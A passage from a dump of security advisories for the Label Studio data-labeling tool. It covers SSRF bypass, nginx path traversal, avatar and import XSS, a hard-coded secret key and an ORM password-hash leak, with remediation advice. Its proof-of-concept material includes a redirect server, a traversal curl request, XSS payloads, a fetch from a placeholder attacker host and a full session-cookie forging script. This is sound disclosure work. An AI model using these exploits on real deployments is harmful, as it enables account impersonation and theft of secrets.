[`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c 